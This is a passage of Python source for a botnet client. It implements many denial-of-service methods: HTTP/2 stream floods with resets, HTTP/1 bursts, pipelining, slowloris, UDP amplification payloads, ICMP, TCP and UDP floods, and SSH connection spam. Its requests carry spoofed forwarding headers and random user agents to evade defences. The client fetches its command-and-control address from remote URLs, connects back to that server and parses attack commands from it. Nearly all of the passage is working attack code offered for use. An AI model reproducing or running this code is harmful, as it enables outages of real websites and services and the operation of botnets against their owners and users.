                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.61"
            ]
        if HTTPVIP_PROXY_SUPPORT:
            self.load_proxies()

    def load_proxies(self):
        proxy_urls = {
            "http": HTTPVIP_PROXY_URL_HTTP,
            "socks4": HTTPVIP_PROXY_URL_SOCKS4,
            "socks5": HTTPVIP_PROXY_URL_SOCKS5
        }
        for proxy_type, url in proxy_urls.items():
            try:
                response = requests.get(url, timeout=5)
                self.proxies[proxy_type] = [p.strip() for p in response.text.split("\n") if ":" in p.strip()]
            except:
                continue

    def get_random_headers(self):
        return {
            "User-Agent": random.choice(self.user_agents),
            "Accept": random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "application/json,text/javascript,*/*;q=0.01",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "*/*"
            ]),
            "Accept-Language": random.choice([
                "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
                "en-GB,en;q=0.9,fr;q=0.8",
                "de-DE,de;q=0.9,en;q=0.8",
                "ja-JP,ja;q=0.9,en;q=0.8"
            ]),
            "Accept-Encoding": random.choice([
                "gzip, deflate, br, zstd",
                "gzip, deflate, br",
                "gzip, deflate",
                "identity"
            ]),
            "Connection": random.choice(["keep-alive", "close"]) if random.random() > 0.8 else "keep-alive",
            "Cache-Control": random.choice([
                "no-cache, no-store, must-revalidate",
                "max-age=0",
                "no-cache",
                "private, max-age=0"
            ]),
            "Pragma": "no-cache",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": random.choice(["document", "empty", "script", "style", "image"]),
            "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors", "same-origin"]),
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site", "same-site"]),
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": f'"{random.choice(["Windows", "macOS", "Linux"])}"',
            "X-Forwarded-For": f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            "X-Real-IP": f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            "X-Originating-IP": f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            "X-Remote-IP": f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            "X-Client-IP": f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            "X-Forwarded-Host": f"{random.choice(['www.google.com', 'facebook.com', 'youtube.com', 'amazon.com'])}",
            "CF-Connecting-IP": f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            "True-Client-IP": f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        }

    def get_random_path(self):
        paths = [
            "/", "/index.html", "/home", "/about", "/contact", "/login", "/register",
            "/api/v1/data", "/api/v2/users", "/api/auth", "/api/search",
            "/admin", "/admin/login", "/wp-admin/", "/phpmyadmin/", "/cgi-bin/",
            "/assets/js/app.js", "/assets/css/style.css", "/favicon.ico",
            "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
            f"/{random.choice(['search', 'category', 'product', 'user', 'post'])}?id={random.randint(1,99999)}",
            f"/api/{random.choice(['users', 'posts', 'comments', 'data'])}/{random.randint(1,9999)}",
            f"/{random.random():.16f}"[2:],
            f"/path{random.randint(1,99999)}/subpath{random.randint(1,999)}",
            f"/download/{random.choice(['file', 'document', 'image'])}{random.randint(1,9999)}.{random.choice(['pdf', 'jpg', 'png', 'zip'])}",
            f"/{random.choice(['en', 'fr', 'de', 'es', 'ja'])}/{random.choice(['home', 'about', 'products'])}",
            f"/v{random.randint(1,5)}/endpoint/{random.randint(1,999)}",
            "/.env", "/.git/config", "/config.php", "/database.sql",
            f"/webhook/{random.random():.8f}"[2:],
            f"/callback?token={random.random():.12f}"[2:]
        ]
        return random.choice(paths)

    def create_proxy_connection(self):
        if not HTTPVIP_PROXY_SUPPORT or not any(self.proxies.values()):
            return None
        proxy_type = random.choice(["http", "socks4", "socks5"])
        if not self.proxies[proxy_type]:
            return None
        proxy = random.choice(self.proxies[proxy_type])
        try:
            proxy_host, proxy_port = proxy.split(":")
            return {"type": proxy_type, "host": proxy_host, "port": int(proxy_port)}
        except:
            return None

    

    def flood_http2_advanced(self):
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(['h2', 'http/1.1'])
            ctx.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
            sock = socket.create_connection((self.target, self.port), timeout=HTTPVIP_TIMEOUT_SECONDS)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock = ctx.wrap_socket(sock, server_hostname=self.target)
            if sock.selected_alpn_protocol() != 'h2':
                sock.close()
                return self.flood_http1_burst()
            conn = h2.connection.H2Connection()
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            stream_count = random.randint(50, 200)
            active_streams = []
            for i in range(stream_count):
                if self.stop_event.is_set():
                    break
                headers = [
                    (':method', random.choice(['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'TRACE'])),
                    (':path', self.get_random_path()),
                    (':scheme', 'https'),
                    (':authority', f"{self.target}:{self.port}"),
                ]
                rand_headers = self.get_random_headers()
                for k, v in list(rand_headers.items())[:random.randint(5, len(rand_headers))]:
                    headers.append((k.lower(), str(v)))
                stream_id = conn.get_next_available_stream_id()
                active_streams.append(stream_id)
                end_stream = random.random() > 0.3
                conn.send_headers(stream_id, headers, end_stream=end_stream)
                if not end_stream and random.random() > 0.5:
                    data_size = random.randint(1, 8192)
                    data = bytes([random.randint(0, 255) for _ in range(data_size)])
                    conn.send_data(stream_id, data, end_stream=True)
                if i % random.randint(5, 15) == 0:
                    sock.sendall(conn.data_to_send())
                if random.random() > 0.9 and active_streams:
                    reset_stream = random.choice(active_streams)
                    conn.reset_stream(reset_stream, error_code=random.choice([0x0, 0x1, 0x2, 0x8]))
                    active_streams.remove(reset_stream)
                if random.random() > 0.95:
                    conn.ping(b'\x00\x00\x00\x00\x00\x00\x00\x00')
            sock.sendall(conn.data_to_send())
            try:
                sock.settimeout(0.1)
                data = sock.recv(65535)
                conn.receive_data(data)
            except:
                pass
            self.request_count += stream_count
            sock.close()
            return True
        except Exception as e:
            return False

    def flood_http1_burst(self):
        connections = []
        try:
            for _ in range(random.randint(10, 50)):
                if self.stop_event.is_set():
                    break
                use_https = self.port in [443, 8443, 9443] or random.random() > 0.7
                if use_https:
                    conn = httplib.HTTPSConnection(self.target, self.port, timeout=HTTPVIP_TIMEOUT_SECONDS)
                else:
                    conn = httplib.HTTPConnection(self.target, self.port, timeout=HTTPVIP_TIMEOUT_SECONDS)
                connections.append(conn)
                method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'TRACE'])
                path = self.get_random_path()
                headers = self.get_random_headers()
                body = None
                if method in ['POST', 'PUT', 'PATCH'] and random.random() > 0.3:
                    body_types = [
                        b'x' * random.randint(1, 16384),
                        f'{{"timestamp": {time.time()}, "data": "{random.random():.16f}", "id": {random.randint(1,999999)}}}'.encode(),
                        f'param1=value{random.randint(1,9999)}&param2=test{random.randint(1,999)}&data={random.random():.8f}'.encode(),
                        f'<xml><timestamp>{int(time.time())}</timestamp><data>{random.randint(1,999999)}</data><payload>{"x" * random.randint(100, 1000)}</payload></xml>'.encode(),
                        bytes([random.randint(0, 255) for _ in range(random.randint(500, 4096))])
                    ]
                    body = random.choice(body_types)
                    headers['Content-Length'] = str(len(body))
                    headers['Content-Type'] = random.choice([
                        'application/json', 'application/x-www-form-urlencoded',
                        'text/xml', 'text/plain', 'application/octet-stream',
                        'multipart/form-data', 'application/x-protobuf'
                    ])
                conn.request(method, path, body=body, headers=headers)
                if random.random() > 0.7:
                    response = conn.getresponse()
                    data = response.read(random.randint(1024, 8192))
                self.request_count += 1
                if random.random() > 0.6:
                    for _ in range(random.randint(1, 10)):
                        conn.request(random.choice(['GET', 'HEAD']), self.get_random_path(), headers=self.get_random_headers())
                        if random.random() > 0.5:
                            resp = conn.getresponse()
                            resp.read(random.randint(512, 2048))
                        self.request_count += 1
            for conn in connections:
                try:
                    conn.close()
                except:
                    pass
            return True
        except Exception as e:
            for conn in connections:
                try:
                    conn.close()
                except:
                    pass
            return False

    def pipeline_flood(self):
        try:
            sock = socket.create_connection((self.target, self.port), timeout=HTTPVIP_TIMEOUT_SECONDS)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            request_batch = []
            batch_size = random.randint(20, 100)
            for _ in range(batch_size):
                method = random.choice(['GET', 'HEAD', 'OPTIONS', 'TRACE'])
                path = self.get_random_path()
                headers = self.get_random_headers()
                request = f"{method} {path} HTTP/1.1\r\n"
                request += f"Host: {self.target}:{self.port}\r\n"
                for k, v in list(headers.items())[:random.randint(3, 8)]:
                    request += f"{k}: {v}\r\n"
                request += "\r\n"
                request_batch.append(request.encode())
            combined_request = b''.join(request_batch)
            sock.sendall(combined_request)
            self.request_count += batch_size
            try:
                sock.settimeout(0.2)
                data = sock.recv(65535)
            except:
                pass
            sock.close()
            return True
        except Exception as e:
            return False

    def slowloris_advanced(self):
        sockets = []
        try:
            socket_count = random.randint(20, 100)
            for i in range(socket_count):
                if self.stop_event.is_set():
                    break
                sock = socket.create_connection((self.target, self.port), timeout=HTTPVIP_TIMEOUT_SECONDS)
                sockets.append(sock)
                headers = self.get_random_headers()
                request = f"GET {self.get_random_path()} HTTP/1.1\r\n"
                request += f"Host: {self.target}:{self.port}\r\n"
                essential_headers = list(headers.items())[:3]
                for k, v in essential_headers:
                    request += f"{k}: {v}\r\n"
                sock.send(request.encode())
                self.request_count += 1
            for cycle in range(random.randint(5, 30)):
                if self.stop_event.is_set():
                    break
                for sock in sockets[:]:
                    try:
                        header_line = f"X-Custom-{cycle}-{random.randint(1,9999)}: {random.random():.16f}\r\n"
                        sock.send(header_line.encode())
                        time.sleep(random.uniform(0.01, 0.1))
                    except:
                        sockets.remove(sock)
                if not sockets:
                    break
            for sock in sockets:
                try:
                    sock.send(b"\r\n")
                    sock.close()
                except:
                    pass
            return True
        except Exception as e:
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
            return False

    def udp_amplification(self):
        try:
            payloads = [
                b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07' + b'version' + b'\x04' + b'bind' + b'\x00\x00\x10\x00\x03',
                b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b' + b'objectclass' + b'\x30\x00',
                b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x20' + b'ABCDEFGHIJ0123456789ABCDEFGHIJ01' + b'\x00\x00\x01\x00\x01',
                bytes([random.randint(0, 255) for _ in range(random.randint(64, 512))])
            ]
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(HTTPVIP_TIMEOUT_SECONDS)
            for _ in range(random.randint(50, 200)):
                if self.stop_event.is_set():
                    break
                payload = random.choice(payloads)
                target_port = random.choice([53, 123, 161, 389, 1900, self.port])
                try:
                    sock.sendto(payload, (self.target, target_port))
                    self.request_count += 1
                except:
                    continue
            sock.close()
            return True
        except Exception as e:
            return False

    def attack_loop(self):
        start_time = time.time()
        end_time = start_time + self.duration
        attack_methods = [
            (self.flood_http2_advanced, 35),
            (self.flood_http1_burst, 30),
            (self.pipeline_flood, 20),
            (self.slowloris_advanced, 10),
            (self.udp_amplification, 5)
        ]
        while time.time() < end_time and not self.stop_event.is_set():
            current_time = time.time()
            if current_time >= end_time:
                break
            try:
                method, weight = random.choices(attack_methods, weights=[w for _, w in attack_methods], k=1)[0]
                method()
                if HTTPVIP_REQUEST_DELAY > 0:
                    time.sleep(HTTPVIP_REQUEST_DELAY)
                else:
                    time.sleep(random.uniform(0.0001, 0.001))
            except Exception as e:
                time.sleep(random.uniform(0.01, 0.05))
            if self.stop_event.is_set():
                break

async def async_attack_worker(target, port, duration, semaphore, stop_event):
    async with semaphore:
        connector = aiohttp.TCPConnector(limit=1000, limit_per_host=100, ttl_dns_cache=300)
        timeout = aiohttp.ClientTimeout(total=HTTPVIP_TIMEOUT_SECONDS)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            start_time = time.time()
            end_time = start_time + duration
            request_count = 0
            while time.time() < end_time and not stop_event.is_set():
                current_time = time.time()
                if current_time >= end_time:
                    break
                try:
                    tasks = []
                    batch_size = random.randint(50, 200)
                    for _ in range(batch_size):
                        if stop_event.is_set() or time.time() >= end_time:
                            break
                        url = f"{'https' if port in [443, 8443, 9443] else 'http'}://{target}:{port}/{random.random():.16f}"[2:]
                        method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'HEAD'])
                        headers = {
                            "User-Agent": f"AdvancedBot/{random.random():.8f}",
                            "Accept": "*/*",
                            "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                        }
                        task = session.request(method, url, headers=headers, ssl=False)
                        tasks.append(task)
                    if tasks:
                        await asyncio.gather(*tasks, return_exceptions=True)
                        request_count += len(tasks)
                    await asyncio.sleep(0.001)
                except Exception as e:
                    await asyncio.sleep(0.01)

def start_httpvip_attack(target, port, duration, attack_id):
    print(f"Bot: Starting Advanced HTTPVIP on {target}:{port} for {duration}s. ID: {attack_id}")
    stop_event_local = threading.Event()
    with attacks_lock:
        active_attacks[attack_id] = stop_event_local
    try:
        test_conn = socket.create_connection((target, port), timeout=5)
        test_conn.close()
        print(f"Connection verified to {target}:{port}")
    except Exception as e:
        print(f"Connection test failed: {e}")
        with attacks_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        return
    attackers = []
    thread_count = min(HTTPVIP_PROCESS_COUNT, 10000)
    def monitor_duration():
        time.sleep(duration)
        stop_event_local.set()
        print(f"Duration {duration}s reached, stopping attack {attack_id}")
    duration_monitor = threading.Thread(target=monitor_duration, daemon=True)
    duration_monitor.start()
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = []
        for i in range(thread_count):
            if stop_event_local.is_set():
                break
            attacker = HTTPVIPAttacker(target, port, duration, i)
            attacker.stop_event = stop_event_local
            attackers.append(attacker)
            future = executor.submit(attacker.attack_loop)
            futures.append(future)
            if i % 100 == 0:
                time.sleep(0.001)
        async_thread_count = min(1000, HTTPVIP_PROCESS_COUNT // 10)
        async_thread = None
        if async_thread_count > 0:
            def run_async_attacks():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                semaphore = asyncio.Semaphore(async_thread_count)
                tasks = [async_attack_worker(target, port, duration, semaphore, stop_event_local) for _ in range(async_thread_count)]
                loop.run_until_complete(asyncio.gather(*tasks, return_exceptions=True))
                loop.close()
            async_thread = threading.Thread(target=run_async_attacks, daemon=True)
            async_thread.start()
        start_time = time.time()
        while not stop_event_local.is_set():
            elapsed = time.time() - start_time
            if elapsed >= duration:
                stop_event_local.set()
                break
            active_count = sum(1 for f in futures if not f.done())
            total_requests = sum(a.request_count for a in attackers)
            remaining_time = max(0, duration - elapsed)
            print(f"Time: {elapsed:.1f}s/{duration}s, Active threads: {active_count}, Requests: {total_requests}, Remaining: {remaining_time:.1f}s")
            time.sleep(1)
        stop_event_local.set()
        print(f"Stopping all threads for attack {attack_id}")
        for future in concurrent.futures.as_completed(futures, timeout=10):
            try:
                future.result(timeout=2)
            except:
                pass
        if async_thread and async_thread.is_alive():
            async_thread.join(timeout=5)
    with attacks_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    total_requests = sum(a.request_count for a in attackers)
    print(f"Bot: Advanced HTTPVIP finished for ID: {attack_id}, Total requests: {total_requests}, Duration: {duration}s")

ICMP_TYPE_ECHO_REQUEST = 8
ICMP_CODE_ECHO_REQUEST = 0

def calculate_checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += data[i] + (data[i+1] << 8)
    if n:
        s += data[len(data) - 1]
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xFFFF
    return socket.htons(s)

def icmp_sender(target_ip, stop_event, thread_id_num):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        packet_id = (os.getpid() ^ thread_id_num) & 0xFFFF
        sequence_num = 1
        while not stop_event.is_set():
            try:
                payload_size = random.randint(ICMP_PACKET_SIZE_MIN, ICMP_PACKET_SIZE_MAX)
                payload = random_payload_func(payload_size)
                header_without_checksum = struct.pack('!BBHHH', ICMP_TYPE_ECHO_REQUEST, ICMP_CODE_ECHO_REQUEST, 0, packet_id, sequence_num)
                packet_to_checksum = header_without_checksum + payload
                checksum_val = calculate_checksum(packet_to_checksum)
                icmp_header = struct.pack('!BBHHH', ICMP_TYPE_ECHO_REQUEST, ICMP_CODE_ECHO_REQUEST, checksum_val, packet_id, sequence_num)
                packet = icmp_header + payload
                sock.sendto(packet, (target_ip, 0))
                sequence_num = (sequence_num + 1) & 0xFFFF
                if ICMP_SEND_DELAY > 0:
                    time.sleep(ICMP_SEND_DELAY)
            except socket.error:
                time.sleep(0.01)
            except Exception:
                time.sleep(0.05)
                break
            if stop_event.is_set():
                break
        sock.close()
    except socket.error:
        pass
    except Exception:
        pass

def start_icmp_flood(target_ip_param, port_param_is_actually_duration, duration_param_is_actually_attack_id_str):
    actual_target_ip = target_ip_param
    try:
        actual_duration = int(port_param_is_actually_duration)
        parts = duration_param_is_actually_attack_id_str.split('-')
        port_str_candidate = parts[-1]
        if port_str_candidate.lower().endswith('s'): # Should not happen if attack_id is passed
            port_str_candidate = port_str_candidate[:-1]
        actual_port = int(parts[2]) # Assuming attack_id is like "method-target-port"
    except (ValueError, IndexError):
        print(f"Bot: Error parsing ICMP parameters from CNC.")
        print(f"  Received for IP: {actual_target_ip}")
        print(f"  Received as 2nd arg (expected duration): '{port_param_is_actually_duration}'")
        print(f"  Received as 3rd arg (expected port info in attack_id): '{duration_param_is_actually_attack_id_str}'")
        print(f"  Attack aborted.")
        return

    attack_id_uuid = str(uuid.uuid4())
    print(f"Bot: Starting ICMP flood on {actual_target_ip} (port {actual_port} ignored) for {actual_duration}s. ID: {attack_id_uuid}")
    stop_event = threading.Event()
    with attacks_lock:
        active_attacks[attack_id_uuid] = stop_event
    threads = []
    for i in range(ICMP_THREAD_COUNT):
        if stop_event.is_set():
            break
        thread = threading.Thread(target=icmp_sender, args=(actual_target_ip, stop_event, i), daemon=True)
        threads.append(thread)
        thread.start()
    time.sleep(actual_duration)
    stop_event.set()
    for t in threads:
        t.join(timeout=2)
    with attacks_lock:
        if attack_id_uuid in active_attacks:
            del active_attacks[attack_id_uuid]
    print(f"Bot: ICMP flood finished for ID: {attack_id_uuid}")


def ssh_spammer_worker(target_ip, target_port, stop_event):
    while not stop_event.is_set():
        client = None
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=target_ip,
                port=target_port,
                username=str(uuid.uuid4())[:8],
                password=str(uuid.uuid4()),
                timeout=SSH_CONNECT_TIMEOUT,
                banner_timeout=SSH_BANNER_TIMEOUT,
                auth_timeout=SSH_AUTH_TIMEOUT,
                allow_agent=False,
                look_for_keys=False
            )
            hold_time = random.uniform(SSH_HOLD_CONNECTION_MIN, SSH_HOLD_CONNECTION_MAX)
            time.sleep(hold_time)
        except paramiko.AuthenticationException:
            pass
        except paramiko.SSHException:
            pass
        except socket.error:
            pass
        except Exception:
            pass
        finally:
            if client:
                try:
                    client.close()
                except Exception:
                    pass
        if stop_event.is_set():
            break
        inter_attempt_delay = random.uniform(SSH_INTER_ATTEMPT_DELAY_MIN, SSH_INTER_ATTEMPT_DELAY_MAX)
        time.sleep(inter_attempt_delay)

def start_ssh_spam_attack(target_ip, target_port, duration_seconds):
    attack_id = str(uuid.uuid4())
    print(f"Bot: Starting SSH-SPAM on {target_ip}:{target_port} for {duration_seconds}s. ID: {attack_id}")
    stop_event = threading.Event()
    with attacks_lock:
        active_attacks[attack_id] = stop_event
    threads = []
    for _ in range(SSH_SPAM_THREAD_COUNT):
        if stop_event.is_set():
            break
        thread = threading.Thread(target=ssh_spammer_worker, args=(target_ip, target_port, stop_event), daemon=True)
        threads.append(thread)
        thread.start()
    time.sleep(duration_seconds)
    stop_event.set()
    for t in threads:
        t.join(timeout=max(SSH_CONNECT_TIMEOUT, SSH_BANNER_TIMEOUT, SSH_AUTH_TIMEOUT) + 1)
    with attacks_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    print(f"Bot: SSH-SPAM finished for ID: {attack_id}")

def swifttcp_sender(target_ip, target_port, stop_event):
    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(SOCKET_TIMEOUT)
            sock.connect((target_ip, target_port))
            payload_size = random.randint(SWIFTTCP_PACKET_SIZE_MIN, SWIFTTCP_PACKET_SIZE_MAX)
            payload = random_payload_func(payload_size)
            while not stop_event.is_set():
                try:
                    sock.send(payload)
                    if SWIFTTCP_SOCKET_SEND_DELAY > 0:
                        time.sleep(SWIFTTCP_SOCKET_SEND_DELAY)
                except socket.error:
                    break
                except Exception:
                    break
        except (socket.error, Exception):
            time.sleep(0.01)
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

def start_swifttcp_flood(target_ip, target_port, duration_seconds, attack_id):
    print(f"Bot: Starting SWIFTTCP (High PPS) flood on {target_ip}:{target_port} for {duration_seconds}s. ID: {attack_id}")
    stop_event = threading.Event()
    with attacks_lock:
        active_attacks[attack_id] = stop_event
    threads = []
    for _ in range(SWIFTTCP_FLOOD_THREAD_COUNT):
        if stop_event.is_set():
            break
        thread = threading.Thread(target=swifttcp_sender, args=(target_ip, target_port, stop_event), daemon=True)
        threads.append(thread)
        thread.start()
    time.sleep(duration_seconds)
    stop_event.set()
    for t in threads:
        t.join(timeout=2)
    with attacks_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    print(f"Bot: SWIFTTCP flood finished for ID: {attack_id}")

def swiftudp_sender(target_ip, target_port, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload_size = random.randint(SWIFTUDP_PACKET_SIZE_MIN, SWIFTUDP_PACKET_SIZE_MAX)
        payload = random_payload_func(payload_size)
        while not stop_event.is_set():
            try:
                sock.sendto(payload, (target_ip, target_port))
                if SWIFTUDP_SOCKET_SEND_DELAY > 0:
                    time.sleep(SWIFTUDP_SOCKET_SEND_DELAY)
            except socket.error:
                time.sleep(0.01)
            except Exception:
                time.sleep(0.05)
                break
            if stop_event.is_set(): break
        sock.close()
    except Exception:
        pass

def start_swiftudp_flood(target_ip, target_port, duration_seconds, attack_id):
    print(f"Bot: Starting SWIFTUDP (High PPS) flood on {target_ip}:{target_port} for {duration_seconds}s. ID: {attack_id}")
    stop_event = threading.Event()
    with attacks_lock:
        active_attacks[attack_id] = stop_event
    threads = []
    for _ in range(SWIFTUDP_THREAD_COUNT):
        if stop_event.is_set(): break
        thread = threading.Thread(target=swiftudp_sender, args=(target_ip, target_port, stop_event), daemon=True)
        threads.append(thread)
        thread.start()
    time.sleep(duration_seconds)
    stop_event.set()
    for t in threads:
        t.join(timeout=2)
    with attacks_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    print(f"Bot: SWIFTUDP flood finished for ID: {attack_id}")

def tcp_sender(sock, stop_event, target_host_for_header):
    try:
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
            f"CustomBot/{random.randint(1,100)}"
        ]
        paths = ["/", "/?q=" + str(random.randint(1,99999))]
        while not stop_event.is_set():
            try:
                path = random.choice(paths)
                user_agent = random.choice(user_agents)
                method = "GET" if random.random() > 0.3 else "POST"
                request_lines = [
                    f"{method} {path} HTTP/1.1",
                    f"Host: {target_host_for_header}",
                    f"User-Agent: {user_agent}", "Accept: */*", "Connection: keep-alive"
                ]
                if method == "POST":
                    body_len = random.randint(10, 50)
                    body = random_payload_func(body_len).decode(errors='ignore')
                    request_lines.extend([f"Content-Length: {body_len}", "Content-Type: application/x-www-form-urlencoded", "", body])
                else:
                    request_lines.append("")
                request = "\r\n".join(request_lines) + "\r\n"
                sock.settimeout(SOCKET_TIMEOUT)
                sock.sendall(request.encode())
                time.sleep(random.uniform(0.01, 0.05))
            except (socket.timeout, socket.error):
                break
            except Exception:
                break
            if stop_event.is_set(): break
    finally:
        try: sock.shutdown(socket.SHUT_RDWR)
        except: pass
        sock.close()

def tcp_connector(target_ip, target_port, stop_event, target_host_for_header):
    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(SOCKET_TIMEOUT)
            sock.connect((target_ip, target_port))
            sender_thread = threading.Thread(target=tcp_sender, args=(sock, stop_event, target_host_for_header), daemon=True)
            sender_thread.start()
            time.sleep(random.uniform(0.01, 0.1))
        except (socket.timeout, socket.error):
            if sock: sock.close()
            time.sleep(0.1)
        except Exception:
            if sock: sock.close()
            break
        if stop_event.is_set():
            if sock: sock.close()
            break

def start_tcp_flood(target_host, target_port, duration_seconds, attack_id):
    try:
        target_ip = socket.gethostbyname(target_host)
    except socket.gaierror:
        print(f"TCP Flood: Could not resolve hostname: {target_host}")
        return
    stop_event = threading.Event()
    with attacks_lock:
        active_attacks[attack_id] = stop_event
    connector_threads = []
    num_connector_threads = 100
    for _ in range(num_connector_threads):
        thread = threading.Thread(target=tcp_connector, args=(target_ip, target_port, stop_event, target_host), daemon=True)
        connector_threads.append(thread)
        thread.start()
    time.sleep(duration_seconds)
    stop_event.set()
    for t in connector_threads:
        t.join(timeout=SOCKET_TIMEOUT + 1)
    with attacks_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    print(f"TCP flood finished: {attack_id}")

def udp_sender(target_ip, target_port, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop_event.is_set():
            try:
                size = random.randint(64, 1400)
                payload = random_payload_func(size)
                sock.sendto(payload, (target_ip, target_port))
            except socket.error:
                time.sleep(0.05)
            except Exception:
                time.sleep(0.1)
                break
            if stop_event.is_set(): break
        sock.close()
    except Exception:
        pass

def start_udp_flood(target_ip, target_port, duration_seconds, attack_id):
    stop_event = threading.Event()
    with attacks_lock:
        active_attacks[attack_id] = stop_event
    threads = []
    num_threads = 100
    for _ in range(num_threads):
        thread = threading.Thread(target=udp_sender, args=(target_ip, target_port, stop_event), daemon=True)
        threads.append(thread)
        thread.start()
    time.sleep(duration_seconds)
    stop_event.set()
    for t in threads:
        t.join(timeout=2)
    with attacks_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    print(f"UDP flood finished: {attack_id}")

def fetch_c2_config_from_url():
    global current_c2_ip, current_c2_port
    fetched_ip = None
    fetched_port_int = None
    current_c2_ip = None
    current_c2_port = None
    try:
        with urllib.request.urlopen(C2_IP_URL, timeout=HTTP_TIMEOUT) as response_ip:
            fetched_ip = response_ip.read().decode('utf-8').strip()
        with urllib.request.urlopen(C2_PORT_URL, timeout=HTTP_TIMEOUT) as response_port:
            port_str = response_port.read().decode('utf-8').strip()
            if port_str.isdigit():
                fetched_port_int = int(port_str)
        if fetched_ip and fetched_port_int and (0 < fetched_port_int <= 65535):
            current_c2_ip = fetched_ip
            current_c2_port = fetched_port_int
            return True
    except Exception:
        pass
    return False

def connect_to_c2():
    global current_c2_ip, current_c2_port
    while not _stop_main_loop.is_set():
        while not (current_c2_ip and current_c2_port) and not _stop_main_loop.is_set():
            print("Fetching C2 configuration...")
            if fetch_c2_config_from_url():
                print(f"C2 config acquired: {current_c2_ip}:{current_c2_port}")
                break
            else:
                print(f"Failed to fetch C2 configuration. Retrying in {RECONNECT_DELAY}s...")
                for _ in range(RECONNECT_DELAY):
                    if _stop_main_loop.is_set(): return None
                    time.sleep(1)
        if _stop_main_loop.is_set(): return None
        if not (current_c2_ip and current_c2_port) : continue
        host = current_c2_ip
        port = current_c2_port
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.settimeout(10)
            conn.connect((host, port))
            print(f"Connected to C2 at {host}:{port}")
            return conn
        except Exception:
            print(f"Failed to connect to C2 at {host}:{port}. Re-fetching configuration...")
            current_c2_ip = None
            current_c2_port = None
            for _ in range(RECONNECT_DELAY):
                if _stop_main_loop.is_set(): return None
                time.sleep(1)
    return None

def command_handler(command_str):
    parts = command_str.strip().split()
    if not parts or not parts[0].startswith(".") or len(parts) < 4: return
    method = parts[0][1:]
    target_host = parts[1]
